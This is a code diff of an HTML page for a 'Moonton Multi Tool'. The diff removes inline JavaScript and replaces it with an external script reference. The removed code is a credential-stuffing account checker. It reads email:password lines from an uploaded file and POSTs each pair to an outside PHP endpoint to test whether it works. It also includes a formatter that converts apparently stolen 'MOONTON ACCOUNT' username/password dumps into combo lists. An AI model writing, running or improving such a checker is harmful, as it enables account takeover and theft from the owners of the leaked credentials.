@@ -10,107 +10,18 @@
   <div class="container">
     <h1>Moonton Multi Tool</h1>
     <input type="file" id="fileInput" />
-    <button onclick="openTool('checker')">Account Checker</button>
-    <button onclick="openTool('remover')">URL Remover</button>
-    <button onclick="openTool('formatter')">Account Formatter</button>
+    <div id="mainMenu">
+      <button onclick="showTool('checker')">Account Checker</button>
+      <button onclick="showTool('remover')">URL Remover</button>
+      <button onclick="showTool('formatter')">Account Formatter</button>
+    </div>
+
+    <div id="toolUI" style="display: none;">
+      <div id="toolContent"></div>
+      <button class="back-btn" onclick="goBack()">Back to Menu</button>
+    </div>
   </div>
 
-  <script>
-    function openTool(type) {
-      const fileInput = document.getElementById("fileInput");
-      if (!fileInput.files.length) {
-        alert("Please upload a file first!");
-        return;
-      }
-
-      const file = fileInput.files[0];
-      const reader = new FileReader();
-      reader.onload = function () {
-        const fileContent = reader.result;
-        const newWindow = window.open("", "_blank");
-        newWindow.document.write(generateHTML(fileContent, type));
-      };
-      reader.readAsText(file);
-    }
-
-    function generateHTML(fileContent, type) {
-      return `
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-          <meta charset="UTF-8">
-          <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <title>${type.charAt(0).toUpperCase() + type.slice(1)} Results</title>
-          <link rel="stylesheet" href="styles.css">
-        </head>
-        <body>
-          <div class="container">
-            <h1>${type.charAt(0).toUpperCase() + type.slice(1)} Results</h1>
-            <pre>${processContent(fileContent, type)}</pre>
-            <button onclick="window.close()">Go Back</button>
-          </div>
-        </body>
-        </html>
-      `;
-    }
-
-    async function processContent(content, type) {
-      const lines = content.split("\n").filter(line => line.trim());
-      switch (type) {
-        case "checker":
-          return await Promise.all(
-            lines.map(async line => await checkAccount(line))
-          ).then(results => results.join("\n"));
-        case "remover":
-          return lines.map(line => removeURLs(line)).join("\n");
-        case "formatter":
-          return formatAccounts(lines).join("\n");
-        default:
-          return content;
-      }
-    }
-
-    async function checkAccount(line) {
-      const [email, password] = line.split(":");
-      const formData = new URLSearchParams();
-      formData.append("uu", email);
-      formData.append("pp", password);
-
-      try {
-        const response = await fetch("https://www.jarelldanegods.elementfx.com/hat.php", {
-          method: "POST",
-          body: formData,
-        });
-        const result = await response.json();
-        return `${line} => ${result.status || "Error"}`;
-      } catch {
-        return `${line} => Failed`;
-      }
-    }
-
-    function removeURLs(line) {
-      const patterns = ["http://", "https://", "www."];
-      patterns.forEach(pattern => {
-        if (line.includes(pattern)) {
-          line = line.replace(pattern, "");
-        }
-      });
-      return line;
-    }
-
-    function formatAccounts(lines) {
-      const formatted = [];
-      lines.forEach(line => {
-        if (line.startsWith("[MOONTON ACCOUNT]")) {
-          if (formatted.length) formatted.push("");
-        } else if (line.startsWith("USERNAME:")) {
-          formatted.push(line.split(":")[1].trim());
-        } else if (line.startsWith("PASSWORD:")) {
-          formatted[formatted.length - 1] += `:${line.split(":")[1].trim()}`;
-        }
-      });
-      return formatted;
-    }
-  </script>
+  <script src="scripts.js"></script>
 </body>
 </html>
